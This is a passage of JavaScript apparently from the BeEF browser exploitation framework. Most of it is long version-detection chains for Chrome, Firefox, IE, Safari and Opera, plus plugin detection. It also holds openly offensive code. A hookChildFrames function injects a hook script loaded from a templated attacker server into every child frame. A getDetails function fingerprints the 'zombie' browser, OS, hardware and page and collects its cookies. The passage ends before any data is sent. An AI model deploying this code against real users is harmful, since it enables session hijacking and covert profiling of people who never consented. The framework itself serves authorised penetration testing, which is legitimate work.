            return '34'
        }
        ;   // Chrome 34 for iOS
        if (this.isC35()) {
            return '35'
        }
        ;   // Chrome 35
        if (this.isC35iOS()) {
            return '35'
        }
        ;   // Chrome 35 for iOS
        if (this.isC36()) {
            return '36'
        }
        ;   // Chrome 36
        if (this.isC36iOS()) {
            return '36'
        }
        ;   // Chrome 36 for iOS
        if (this.isC37()) {
            return '37'
        }
        ;   // Chrome 37
        if (this.isC37iOS()) {
            return '37'
        }
        ;   // Chrome 37 for iOS
        if (this.isC38()) {
            return '38'
        }
        ;   // Chrome 38
        if (this.isC38iOS()) {
            return '38'
        }
        ;   // Chrome 38 for iOS
        if (this.isC39()) {
            return '39'
        }
        ;   // Chrome 39
        if (this.isC39iOS()) {
            return '39'
        }
        ;   // Chrome 39 for iOS
        if (this.isC40()) {
            return '40'
        }
        ;   // Chrome 40
        if (this.isC40iOS()) {
            return '40'
        }
        ;   // Chrome 40 for iOS
        if (this.isC41()) {
            return '41'
        }
        ;   // Chrome 41
        if (this.isC41iOS()) {
            return '41'
        }
        ;   // Chrome 41 for iOS
        if (this.isC42()) {
            return '42'
        }
        ;   // Chrome 42
        if (this.isC42iOS()) {
            return '42'
        }
        ;   // Chrome 42 for iOS
        if (this.isC43()) {
            return '43'
        }
        ;   // Chrome 43
        if (this.isC43iOS()) {
            return '43'
        }
        ;   // Chrome 43 for iOS
        if (this.isC44()) {
            return '44'
        }
        ;   // Chrome 44
        if (this.isC44iOS()) {
            return '44'
        }
        ;   // Chrome 44 for iOS
        if (this.isC45()) {
            return '45'
        }
        ;   // Chrome 45
        if (this.isC45iOS()) {
            return '45'
        }
        ;   // Chrome 45 for iOS
        if (this.isC46()) {
            return '46'
        }
        ;// Chrome 46
        if (this.isC46iOS()) {
            return '46'
        }
        ;   // Chrome 46 for iOS
        if (this.isC47()) {
            return '47'
        }
        ;// Chrome 47
        if (this.isC47iOS()) {
            return '47'
        }
        ;   // Chrome 47 for iOS
        if (this.isC48()) {
            return '48'
        }
        ;// Chrome 48
        if (this.isC48iOS()) {
            return '48'
        }
        ;   // Chrome 48 for iOS
        if (this.isC49()) {
            return '49'
        }
        ;// Chrome 49
        if (this.isC49iOS()) {
            return '49'
        }
        ;   // Chrome 49 for iOS
        if (this.isC50()) {
            return '50'
        }
        ;// Chrome 50
        if (this.isC50iOS()) {
            return '50'
        }
        ;   // Chrome 50 for iOS
        if (this.isC51()) {
            return '51'
        }
        ;// Chrome 51
        if (this.isC51iOS()) {
            return '51'
        }
        ;   // Chrome 51 for iOS
        if (this.isC52()) {
            return '52'
        }
        ;// Chrome 52
        if (this.isC52iOS()) {
            return '52'
        }
        ;   // Chrome 52 for iOS
        if (this.isC53()) {
            return '53'
        }
        ;// Chrome 53
        if (this.isC53iOS()) {
            return '53'
        }
        ;   // Chrome 53 for iOS
        if (this.isC54()) {
            return '54'
        }
        ;// Chrome 54
        if (this.isC54iOS()) {
            return '54'
        }
        ;   // Chrome 54 for iOS
        if (this.isC55()) {
            return '55'
        }
        ;// Chrome 55
        if (this.isC55iOS()) {
            return '55'
        }
        ;   // Chrome 55 for iOS
        if (this.isC56()) {
            return '56'
        }
        ;// Chrome 56
        if (this.isC56iOS()) {
            return '56'
        }
        ;   // Chrome 56 for iOS
        if (this.isC57()) {
            return '57'
        }
        ;// Chrome 57
        if (this.isC57iOS()) {
            return '57'
        }
        ;   // Chrome 57 for iOS
        if (this.isC58()) {
            return '58'
        }
        ;// Chrome 58
        if (this.isC58iOS()) {
            return '58'
        }
        ;   // Chrome 58 for iOS


        if (this.isFF2()) {
            return '2'
        }
        ;	// Firefox 2
        if (this.isFF3()) {
            return '3'
        }
        ;	// Firefox 3
        if (this.isFF3_5()) {
            return '3.5'
        }
        ;	// Firefox 3.5
        if (this.isFF3_6()) {
            return '3.6'
        }
        ;	// Firefox 3.6
        if (this.isFF4()) {
            return '4'
        }
        ;	// Firefox 4
        if (this.isFF5()) {
            return '5'
        }
        ;	// Firefox 5
        if (this.isFF6()) {
            return '6'
        }
        ;	// Firefox 6
        if (this.isFF7()) {
            return '7'
        }
        ;	// Firefox 7
        if (this.isFF8()) {
            return '8'
        }
        ;	// Firefox 8
        if (this.isFF9()) {
            return '9'
        }
        ;	// Firefox 9
        if (this.isFF10()) {
            return '10'
        }
        ;	// Firefox 10
        if (this.isFF11()) {
            return '11'
        }
        ;	// Firefox 11
        if (this.isFF12()) {
            return '12'
        }
        ;	// Firefox 12
        if (this.isFF13()) {
            return '13'
        }
        ;	// Firefox 13
        if (this.isFF14()) {
            return '14'
        }
        ;	// Firefox 14
        if (this.isFF15()) {
            return '15'
        }
        ;	// Firefox 15
        if (this.isFF16()) {
            return '16'
        }
        ;	// Firefox 16
        if (this.isFF17()) {
            return '17'
        }
        ;    // Firefox 17
        if (this.isFF18()) {
            return '18'
        }
        ;    // Firefox 18
        if (this.isFF19()) {
            return '19'
        }
        ;    // Firefox 19
        if (this.isFF20()) {
            return '20'
        }
        ;    // Firefox 20
        if (this.isFF21()) {
            return '21'
        }
        ;    // Firefox 21
        if (this.isFF22()) {
            return '22'
        }
        ;   // Firefox 22
        if (this.isFF23()) {
            return '23'
        }
        ;   // Firefox 23
        if (this.isFF24()) {
            return '24'
        }
        ;   // Firefox 24
        if (this.isFF25()) {
            return '25'
        }
        ;   // Firefox 25
        if (this.isFF26()) {
            return '26'
        }
        ;   // Firefox 26
        if (this.isFF27()) {
            return '27'
        }
        ;   // Firefox 27
        if (this.isFF28()) {
            return '28'
        }
        ;   // Firefox 28
        if (this.isFF29()) {
            return '29'
        }
        ;   // Firefox 29
        if (this.isFF30()) {
            return '30'
        }
        ;   // Firefox 30
        if (this.isFF31()) {
            return '31'
        }
        ;   // Firefox 31
        if (this.isFF32()) {
            return '32'
        }
        ;   // Firefox 32
        if (this.isFF33()) {
            return '33'
        }
        ;   // Firefox 33
        if (this.isFF34()) {
            return '34'
        }
        ;   // Firefox 34
        if (this.isFF35()) {
            return '35'
        }
        ;   // Firefox 35
        if (this.isFF36()) {
            return '36'
        }
        ;   // Firefox 36
        if (this.isFF37()) {
            return '37'
        }
        ;   // Firefox 37
        if (this.isFF38()) {
            return '38'
        }
        ;   // Firefox 38
        if (this.isFF39()) {
            return '39'
        }
        ;   // Firefox 39
        if (this.isFF40()) {
            return '40'
        }
        ;   // Firefox 40
        if (this.isFF41()) {
            return '41'
        }
        ;   // Firefox 41
        if (this.isFF42()) {
            return '42'
        }
        ;   // Firefox 42
        if (this.isFF43()) {
            return '43'
        }
        ;   // Firefox 43
        if (this.isFF44()) {
            return '44'
        }
        ;   // Firefox 44
        if (this.isFF45()) {
            return '45'
        }
        ;   // Firefox 45
        if (this.isFF46()) {
            return '46'
        }
        ;   // Firefox 46
        if (this.isFF47()) {
            return '47'
        }
        ;   // Firefox 47
        if (this.isFF48()) {
            return '48'
        }
        ;   // Firefox 48
        if (this.isFF49()) {
            return '49'
        }
        ;   // Firefox 49
        if (this.isFF50()) {
            return '50'
        }
        ;   // Firefox 50
        if (this.isFF51()) {
            return '51'
        }
        ;   // Firefox 51
        if (this.isFF52()) {
            return '52'
        }
        ;   // Firefox 52
        if (this.isFF53()) {
            return '53'
        }
        ;   // Firefox 53
        if (this.isFF54()) {
            return '54'
        }
        ;   // Firefox 54
        if (this.isFF55()) {
            return '55'
        }
        ;   // Firefox 55
        if (this.isFF56()) {
            return '56'
        }
        ;   // Firefox 56
        if (this.isFF57()) {
            return '57'
        }
        ;   // Firefox 57
        if (this.isFF58()) {
            return '58'
        }
        ;   // Firefox 58
        if (this.isFF59()) {
            return '59'
        }
        ;   // Firefox 59
        if (this.isFF60()) {
            return '60'
        }
        ;   // Firefox 60
        if (this.isFF61()) {
            return '61'
        }
        ;   // Firefox 61
        if (this.isFF62()) {
            return '62'
        }
        ;   // Firefox 62
        if (this.isFF63()) {
            return '63'
        }
        ;   // Firefox 63
        if (this.isFF64()) {
            return '64'
        }
        ;   // Firefox 64
        if (this.isFF65()) {
            return '65'
        }
        ;   // Firefox 65
        if (this.isFF66()) {
            return '66'
        }
        ;   // Firefox 66
        if (this.isFF67()) {
            return '67'
        }
        ;   // Firefox 67
        if (this.isFF68()) {
            return '68'
        }
        ;   // Firefox 68
        if (this.isFF69()) {
            return '69'
        }
        ;   // Firefox 69
        if (this.isFF70()) {
            return '70'
        }
        ;   // Firefox 70
        if (this.isFF71()) {
            return '71'
        }
        ;   // Firefox 71
        if (this.isFF72()) {
            return '72'
        }
        ;   // Firefox 72
        if (this.isFF73()) {
            return '73'
        }
        ;   // Firefox 73
        if (this.isFF74()) {
            return '74'
        }
        ;   // Firefox 74
        if (this.isFF75()) {
            return '75'
        }
        ;   // Firefox 75
        if (this.isFF76()) {
            return '76'
        }
        ;   // Firefox 76
        if (this.isFF77()) {
            return '77'
        }
        ;   // Firefox 77
        if (this.isFF78()) {
            return '78'
        }
        ;   // Firefox 78
        if (this.isFF79()) {
            return '79'
        }
        ;   // Firefox 79
        if (this.isFF80()) {
            return '80'
        }
        ;   // Firefox 80
        if (this.isFF81()) {
            return '81'
        }
        ;   // Firefox 81
        if (this.isFF82()) {
            return '82'
        }
        ;   // Firefox 82
        if (this.isFF83()) {
            return '83'
        }
        ;   // Firefox 83
        if (this.isFF84()) {
            return '84'
        }
        ;   // Firefox 84
        if (this.isFF85()) {
            return '85'
        }
        ;   // Firefox 85
        if (this.isFF86()) {
            return '86'
        }
        ;   // Firefox 86
        if (this.isFF87()) {
            return '87'
        }
        ;   // Firefox 87
        if (this.isFF88()) {
            return '88'
        }
        ;   // Firefox 88
        if (this.isFF89()) {
            return '89'
        }
        ;   // Firefox 89
        if (this.isFF90()) {
            return '90'
        }
        ;   // Firefox 90
        if (this.isFF91()) {
            return '91'
        }
        ;   // Firefox 91
        if (this.isFF92()) {
            return '92'
        }
        ;   // Firefox 92
        if (this.isFF93()) {
            return '93'
        }
        ;   // Firefox 93
        if (this.isFF94()) {
            return '94'
        }
        ;   // Firefox 94
        if (this.isFF95()) {
            return '95'
        }
        ;   // Firefox 95
        if (this.isFF96()) {
            return '96'
        }
        ;   // Firefox 96
        if (this.isFF97()) {
            return '97'
        }
        ;   // Firefox 97
        if (this.isFF98()) {
            return '98'
        }
        ;   // Firefox 98
        if (this.isFF99()) {
            return '99'
        }
        ;   // Firefox 99

        if (this.isIE6()) {
            return '6'
        }
        ;	// Internet Explorer 6
        if (this.isIE7()) {
            return '7'
        }
        ;	// Internet Explorer 7
        if (this.isIE8()) {
            return '8'
        }
        ;	// Internet Explorer 8
        if (this.isIE9()) {
            return '9'
        }
        ;	// Internet Explorer 9
        if (this.isIE10()) {
            return '10'
        }
        ;	// Internet Explorer 10
        if (this.isIE11()) {
            return '11'
        }
        ;   // Internet Explorer 11

        if (this.isEdge()) {
            return '1'
        }
        ;   // Microsoft Edge

        if (this.isEpi()) {
            // believe the UserAgent string for version info - until whenever
            var epiphanyRe = /Epiphany\/(\d+)/;
            var versionDetails = epiphanyRe.exec( beef.browser.getBrowserReportedName());
            if (versionDetails.length > 1) {
                return versionDetails[1];
            } else {
                return "UNKNOWN"; // returns from here or it may take Safari version details
            }
        }
        ;                       // Epiphany

        if (this.isS4()) {
            return '4'
        }
        ;	// Safari 4
        if (this.isS5()) {
            return '5'
        }
        ;	// Safari 5
        if (this.isS6()) {
            return '6'
        }
        ;	// Safari 6

        if (this.isS7()) {
            return '7'
        }
        ;	// Safari 7
        if (this.isS8()) {
            return '8'
        }
        ;       // Safari 8

        if (this.isO9_52()) {
            return '9.5'
        }
        ;	// Opera 9.5x
        if (this.isO9_60()) {
            return '9.6'
        }
        ;	// Opera 9.6
        if (this.isO10()) {
            return '10'
        }
        ;	// Opera 10.xx
        if (this.isO11()) {
            return '11'
        }
        ;	// Opera 11.xx
        if (this.isO12()) {
            return '12'
        }
        ;	// Opera 12.xx

        // platform.js
        try {
          var version = platform.version;
          if (!!version)
            return version;
        } catch (e) {}

        return 'UNKNOWN';				// Unknown UA
    },

    /**
     * Returns the type of user agent by hooked browser.
     * @return: {String} User agent software.
     *
     * @example: beef.browser.getBrowserName()
     */
    getBrowserName: function () {
        if (this.isEdge()) {
            return 'E'
        }
        ;       // Microsoft Edge any version
        if (this.isC()) {
            return 'C'
        }
        ;   // Chrome any version
        if (this.isFF()) {
            return 'FF'
        }
        ;		// Firefox any version
        if (this.isIE()) {
            return 'IE'
        }
        ;		// Internet Explorer any version
        if (this.isO()) {
            return 'O'
        }
        ;		// Opera any version
        if (this.isEpi()) {
            return 'EP'
        }
        ;			// Epiphany any version
        if (this.isS()) {
            return 'S'
        }
        ;		// Safari any version
        if (this.isA()) {
            return 'A'
        }
        ;               // Avant any version
        if (this.isMidori()) {
            return 'MI'
        }
        ;               // Midori any version
        if (this.isOdyssey()) {
            return 'OD'
        }
        ;               // Odyssey any version
        if (this.isBrave()) {
            return 'BR'
        }
        ;               // Brave any version
        return 'UNKNOWN';	// Unknown UA
    },

    /**
     * Hooks all child frames in the current window
     * Restricted by same-origin policy
     */
    hookChildFrames: function () {

        // create script object
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = '<%== @beef_proto %>://<%== @beef_host %>:<%== @beef_port %><%== @hook_file %>';

        // loop through child frames
        for (var i = 0; i < self.frames.length; i++) {
            try {
                // append hook script
                self.frames[i].document.body.appendChild(script);
                beef.debug("Hooked child frame [src:" + self.frames[i].window.location.href + "]");
            } catch (e) {
                // warn on cross-origin
                beef.debug("Hooking child frame failed: " + e.message);
            }
        }
    },

    /**
     * Checks if the zombie has flash installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasFlash()) { ... }
     */
    hasFlash: function () {
      if (!beef.browser.isIE()) {
        return (navigator.mimeTypes && navigator.mimeTypes["application/x-shockwave-flash"]);
      }

      if (!!navigator.plugins) {
        return (navigator.plugins["Shockwave Flash"] != undefined);
      }

      // IE
      var flash_versions = 12;
      if (window.ActiveXObject != null) {
        for (x = 2; x <= flash_versions; x++) {
          try {
            Flash = eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash." + x + "');");
            if (Flash) {
              return true;
            }
          } catch (e) {
            beef.debug("Creating Flash ActiveX object failed: " + e.message);
          }
        }
      }

      return false;
    },

    /**
     * Checks if the zombie has the QuickTime plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasQuickTime() ) { ... }
     */
    hasQuickTime: function () {
        if (!!navigator.plugins) {
            for (i = 0; i < navigator.plugins.length; i++) {
                if (navigator.plugins[i].name.indexOf("QuickTime") >= 0) {
                    return true;
                }
            }
        }

        // IE
        try {
          var qt_test = new ActiveXObject('QuickTime.QuickTime');
          if (qt_test) {
            return true;
          }
        } catch (e) {
          beef.debug("Creating QuickTime ActiveX object failed: " + e.message);
        }

        return false;
    },

    /**
     * Checks if the zombie has the RealPlayer plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasRealPlayer() ) { ... }
     */
    hasRealPlayer: function () {

        if (!!navigator.plugins) {
          for (i = 0; i < navigator.plugins.length; i++) {
            if (navigator.plugins[i].name.indexOf("RealPlayer") >= 0) {
              return true;
            }
          }
        }

        // IE
        var definedControls = [
          'RealPlayer',
          'rmocx.RealPlayer G2 Control',
          'rmocx.RealPlayer G2 Control.1',
          'RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)',
          'RealVideo.RealVideo(tm) ActiveX Control (32-bit)'
        ];

        for (var i = 0; i < definedControls.length; i++) {
          try {
            var rp_test = new ActiveXObject(definedControls[i]);
            if (rp_test) {
              return true;
            }
          } catch (e) {
            beef.debug("Creating RealPlayer ActiveX object failed: " + e.message);
          }
        }

        return false;
    },

    /**
     * Checks if the zombie has the Windows Media Player plugin installed.
     * @return: {Boolean} true or false.
     *
     * @example: if ( beef.browser.hasWMP() ) { ... }
     */
    hasWMP: function () {
      if (!!navigator.plugins) {
        for (i = 0; i < navigator.plugins.length; i++) {
          if (navigator.plugins[i].name.indexOf("Windows Media Player") >= 0) {
            return true;
          }
        }
      }

      // IE
      try {
        var wmp_test = new ActiveXObject('WMPlayer.OCX');
        if (wmp_test) {
          return true;
        }
      } catch (e) {
        beef.debug("Creating WMP ActiveX object failed: " + e.message);
      }

      return false;
    },

    /**
     *  Checks if VLC is installed
     *  @return: {Boolean} true or false
     **/
    hasVLC: function () {
      if (beef.browser.isIE() || beef.browser.isEdge()) {
        try {
          control = new ActiveXObject("VideoLAN.VLCPlugin.2");
          return true;
        } catch (e) {
          beef.debug("Creating VLC ActiveX object failed: " + e.message);
        }
      } else {
        for (i = 0; i < navigator.plugins.length; i++) {
          if (navigator.plugins[i].name.indexOf("VLC") >= 0) {
            return true;
          }
        }
      }
      return false;
    },

    /**
     * Checks if the zombie has Java enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.javaEnabled()) { ... }
     */
    javaEnabled: function () {
      return navigator.javaEnabled();
    },

    /**
     * Checks if the Phonegap API is available from the hooked origin.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasPhonegap()) { ... }
     */
    hasPhonegap: function () {
        var result = false;

        try {
            if (!!device.phonegap || !!device.cordova) result = true; else result = false;
        }
        catch (e) {
            result = false;
        }
        return result;
    },

    /**
     * Checks if the browser supports CORS
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasCors()) { ... }
     */
    hasCors: function () {
        if ('withCredentials' in new XMLHttpRequest())
            return true;
        else if (typeof XDomainRequest !== "undefined")
            return true;
        else
            return false;
    },

    /**
     * Checks if the zombie has Java installed and enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasJava()) { ... }
     */
    hasJava: function () {
        if (beef.browser.getPlugins().match(/java/i) && beef.browser.javaEnabled()) {
          return true;
        } else {
          return false;
        }
    },

    /**
     * Checks if the zombie has VBScript enabled.
     * @return: {Boolean} true or false.
     *
     * @example: if(beef.browser.hasVBScript()) { ... }
     */
    hasVBScript: function () {
        if ((navigator.userAgent.indexOf('MSIE') != -1) && (navigator.userAgent.indexOf('Win') != -1)) {
            return true;
        } else {
            return false;
        }
    },

    /**
     * Returns the list of plugins installed in the browser.
     */
    getPlugins: function () {

        var results;

        function unique(array) {
          return $j.grep(array, function(el, index) {
            return index === $j.inArray(el, array);
          });
        }

        // Things lacking navigator.plugins
        if (!navigator.plugins) 
          return this.getPluginsIE();

        // All other browsers that support navigator.plugins
        if (navigator.plugins && navigator.plugins.length > 0) {
            results = new Array();
            for (var i = 0; i < navigator.plugins.length; i++) {

                // Firefox returns exact plugin versions
                if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;

                // Webkit and Presto (Opera)
                // Don't support the version attribute
                // Sometimes store the version in description (Real, Adobe)
                else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
            }
            results = unique(results).toString();
            
            // All browsers that don't support navigator.plugins
        } else {
            results = new Array();
            //firefox https://bugzilla.mozilla.org/show_bug.cgi?id=757726
            // On linux sistem the "version" slot is empty so I'll attach "description" after version
            var plugins = {

                'AdobeAcrobat': {
                    'control': 'Adobe Acrobat',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Adobe Acrobat"]["description"];
                            return 'Adobe Acrobat Version  ' + version; //+ " description "+ filename;

                        }
                        catch (e) {
                        }


                    }},
                'Flash': {
                    'control': 'Shockwave Flash',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Shockwave Flash"]["description"];
                            return 'Flash Player Version ' + version; //+ " description "+ filename;
                        }

                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin_Accelerator': {
                    'control': 'Google Talk Plugin Video Accelerator',
                    'return': function (control) {

                        try {
                            version = navigator.plugins['Google Talk Plugin Video Accelerator']["description"];
                            return 'Google Talk Plugin Video Accelerator Version ' + version; //+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Talk_Plugin': {
                    'control': 'Google Talk Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Talk Plugin']["description"];
                            return 'Google Talk Plugin Version ' + version;// " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Facebook_Video_Calling_Plugin': {
                    'control': 'Facebook Video Calling Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Facebook Video Calling Plugin"]["description"];
                            return 'Facebook Video Calling Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Update': {
                    'control': 'Google Update',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Google Update"]["description"];
                            return 'Google Update Version ' + version//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Windows_Activation_Technologies': {
                    'control': 'Windows Activation Technologies',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["Windows Activation Technologies"]["description"];
                            return 'Windows Activation Technologies Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }

                    }},
                'VLC_Web_Plugin': {
                    'control': 'VLC Web Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins["VLC Web Plugin"]["description"];
                            return 'VLC Web Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'Google_Earth_Plugin': {
                    'control': 'Google Earth Plugin',

                    'return': function (control) {
                        try {
                            version = navigator.plugins['Google Earth Plugin']["description"];
                            return 'Google Earth Plugin Version ' + version;//+ " description "+ filename;
                        }
                        catch (e) {
                        }
                    }},
                'FoxitReader_Plugin': {
                    'control': 'FoxitReader Plugin',
                    'return': function (control) {
                        try {
                            version = navigator.plugins['Foxit Reader Plugin for Mozilla']['version'];
                            return 'FoxitReader Plugin Version ' + version;
                        } catch (e) {
                        }
                    }}
            };

            var c = 0;
            for (var i in plugins) {
                //each element od plugins
                var control = plugins[i]['control'];
                try {
                    var version = plugins[i]['return'](control);
                    if (version) {
                        results[c] = version;
                        c = c + 1;
                    }
                }
                catch (e) {
                }

            }
        }
        // Return results
        return results;
    },

    /**
     * Returns a list of plugins detected by IE. This is a hack because IE doesn't
     * support navigator.plugins
     */
    getPluginsIE: function () {
        var results = '';
        var plugins = {
            'AdobePDF6': {
                'control': 'PDF.PdfCtrl',
            'return': function (control) {
                version = control.getVersions().split(',');
                version = version[0].split('=');
                return 'Acrobat Reader v' + parseFloat(version[1]);
            }},
            'AdobePDF7': {
                'control': 'AcroPDF.PDF',
                'return': function (control) {
                    version = control.getVersions().split(',');
                    version = version[0].split('=');
                    return 'Acrobat Reader v' + parseFloat(version[1]);
                }},
            'Flash': {
                'control': 'ShockwaveFlash.ShockwaveFlash',
                'return': function (control) {
                    version = control.getVariable('$version').substring(4);
                    return 'Flash Player v' + version.replace(/,/g, ".");
                }},
            'Quicktime': {
                'control': 'QuickTime.QuickTime',
                'return': function (control) {
                    return 'QuickTime Player';
                }},
            'RealPlayer': {
                'control': 'RealPlayer',
                'return': function (control) {
                    version = control.getVersionInfo();
                    return 'RealPlayer v' + parseFloat(version);
                }},
            'Shockwave': {
                'control': 'SWCtl.SWCtl',
                'return': function (control) {
                    version = control.ShockwaveVersion('').split('r');
                    return 'Shockwave v' + parseFloat(version[0]);
                }},
            'WindowsMediaPlayer': {
                'control': 'WMPlayer.OCX',
                'return': function (control) {
                    return 'Windows Media Player v' + parseFloat(control.versionInfo);
                }},
            'FoxitReaderPlugin': {
                'control': 'FoxitReader.FoxitReaderCtl.1',
                'return': function (control) {
                    return 'Foxit Reader Plugin v' + parseFloat(control.versionInfo);
                }}
        };
        if (window.ActiveXObject) {
            var j = 0;
            for (var i in plugins) {
                var control = null;
                var version = null;
                try {
                    control = new ActiveXObject(plugins[i]['control']);
                } catch (e) {
                }
                if (control) {
                    if (j != 0)
                        results += ', ';
                    results += plugins[i]['return'](control);
                    j++;
                }
            }
        }
        return results;
    },

    /**
     * Returns zombie browser window size.
     * @from: http://www.howtocreate.co.uk/tutorials/javascript/browserwindow
     */
    getWindowSize: function () {
        var myWidth = 0, myHeight = 0;
        if (typeof( window.innerWidth ) == 'number') {
            // Non-IE
            myWidth = window.innerWidth;
            myHeight = window.innerHeight;
        } else if (document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight )) {
            // IE 6+ in 'standards compliant mode'
            myWidth = document.documentElement.clientWidth;
            myHeight = document.documentElement.clientHeight;
        } else if (document.body && ( document.body.clientWidth || document.body.clientHeight )) {
            // IE 4 compatible
            myWidth = document.body.clientWidth;
            myHeight = document.body.clientHeight;
        }
        return {
            width: myWidth,
            height: myHeight
        }
    },

    /**
     * Construct hash from browser details. This function is used to grab the browser details during the hooking process
     */
    getDetails: function () {
        var details = new Array();

        var browser_name = beef.browser.getBrowserName();
        var browser_version = beef.browser.getBrowserVersion();
        var browser_engine = beef.browser.getBrowserEngine();
        var browser_reported_name = beef.browser.getBrowserReportedName();
        var browser_language = beef.browser.getBrowserLanguage();
        var page_title = (document.title) ? document.title : "Unknown";
        var origin = (window.origin) ? window.origin : "Unknown";
        var page_uri = (document.location.href) ? document.location.href : "Unknown";
        var page_referrer = (document.referrer) ? document.referrer : "Unknown";
        var page_hostname = (document.location.hostname) ? document.location.hostname : "Unknown";
        var default_port = "";
        switch (document.location.protocol) {
        case "http:":
            var default_port = "80";
            break;
        case "https:":
            var default_port = "443";
            break;
        }
        var page_hostport = (document.location.port) ? document.location.port : default_port;
        var browser_plugins = beef.browser.getPlugins();
        var date_stamp = new Date().toString();
        var os_name = beef.os.getName();
        var os_family = beef.os.getFamily();
        var os_version = beef.os.getVersion();
        var os_arch = beef.os.getArch();
        var default_browser = beef.os.getDefaultBrowser();
        var hw_type = beef.hardware.getName();
        var battery_details = beef.hardware.getBatteryDetails();
        try {
          var battery_charging_status = battery_details.chargingStatus;
          var battery_level = battery_details.batteryLevel;
          var battery_charging_time = battery_details.chargingTime;
          var battery_discharging_time = battery_details.dischargingTime;
        } catch(e) {}
        var memory = beef.hardware.getMemory();
        var cpu_arch = beef.hardware.getCpuArch();
        var cpu_cores = beef.hardware.getCpuCores();
        var gpu_details = beef.hardware.getGpuDetails();
        try {
          var gpu = gpu_details.gpu;
          var gpu_vendor = gpu_details.vendor;
        } catch(e) {}
        var touch_enabled = (beef.hardware.isTouchEnabled()) ? "Yes" : "No";
        var browser_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : 'Unknown';
        var screen_size = beef.hardware.getScreenSize();
        try {
          var screen_width = screen_size.width;
          var screen_height = screen_size.height;
          var screen_colordepth = screen_size.colordepth;
        } catch(e) {}
        var window_size = beef.browser.getWindowSize();
        try {
          window_width = window_size.width;
          window_height = window_size.height;
        } catch(e) {}
        var vbscript_enabled = (beef.browser.hasVBScript()) ? "Yes" : "No";
        var has_flash = (beef.browser.hasFlash()) ? "Yes" : "No";
        var has_silverlight = (beef.browser.hasSilverlight()) ? "Yes" : "No";
        var has_phonegap = (beef.browser.hasPhonegap()) ? "Yes" : "No";
        var has_googlegears = (beef.browser.hasGoogleGears()) ? "Yes" : "No";
        var has_web_socket = (beef.browser.hasWebSocket()) ? "Yes" : "No";
        var has_web_worker = (beef.browser.hasWebWorker()) ? "Yes" : "No";
        var has_web_gl = (beef.browser.hasWebGL()) ? "Yes" : "No";
        var has_webrtc = (beef.browser.hasWebRTC()) ? "Yes" : "No";
        var has_activex = (beef.browser.hasActiveX()) ? "Yes" : "No";
        var has_quicktime = (beef.browser.hasQuickTime()) ? "Yes" : "No";
        var has_realplayer = (beef.browser.hasRealPlayer()) ? "Yes" : "No";
        var has_wmp = (beef.browser.hasWMP()) ? "Yes" : "No";
        var has_vlc = (beef.browser.hasVLC()) ? "Yes" : "No";

        try {
            var cookies = document.cookie;
            if (cookies) details['browser.window.cookies'] = cookies;
        } catch (e) {
            beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
            details['browser.window.cookies'] = '';
        }

        if (browser_name) details['browser.name'] = browser_name;
        if (browser_version) details['browser.version'] = browser_version;
        if (browser_engine) details['browser.engine'] = browser_engine;
        if (browser_reported_name) details['browser.name.reported'] = browser_reported_name;
        if (browser_platform) details['browser.platform'] = browser_platform;
        if (browser_language) details['browser.language'] = browser_language;
        if (browser_plugins) details['browser.plugins'] = browser_plugins;

        if (page_title) details['browser.window.title'] = page_title;
        if (origin) details['browser.window.origin'] = origin;
        if (page_hostname) details['browser.window.hostname'] = page_hostname;
        if (page_hostport) details['browser.window.hostport'] = page_hostport;
        if (page_uri) details['browser.window.uri'] = page_uri;
        if (page_referrer) details['browser.window.referrer'] = page_referrer;
        if (window_width) details['browser.window.size.width'] = window_width;
        if (window_height) details['browser.window.size.height'] = window_height;
        if (date_stamp) details['browser.date.datestamp'] = date_stamp;

        if (os_name) details['host.os.name'] = os_name;
        if (os_family) details['host.os.family'] = os_family;
        if (os_version) details['host.os.version'] = os_version;
        if (os_arch) details['host.os.arch'] = os_arch;

        if (default_browser) details['host.software.defaultbrowser'] = default_browser;

        if (hw_type) details['hardware.type'] = hw_type;
        if (memory) details['hardware.memory'] = memory;
        if (gpu) details['hardware.gpu'] = gpu;
        if (gpu_vendor) details['hardware.gpu.vendor'] = gpu_vendor;
        if (cpu_arch) details['hardware.cpu.arch'] = cpu_arch;
        if (cpu_cores) details['hardware.cpu.cores'] = cpu_cores;

        if (battery_charging_status) details['hardware.battery.chargingstatus'] = battery_charging_status;
        if (battery_level) details['hardware.battery.level'] = battery_level;
        if (battery_charging_time) details['hardware.battery.chargingtime'] = battery_charging_time;
        if (battery_discharging_time) details['hardware.battery.dischargingtime'] = battery_discharging_time;

        if (screen_width) details['hardware.screen.size.width'] = screen_width;
        if (screen_height) details['hardware.screen.size.height'] = screen_height;
        if (screen_colordepth) details['hardware.screen.colordepth'] = screen_colordepth;
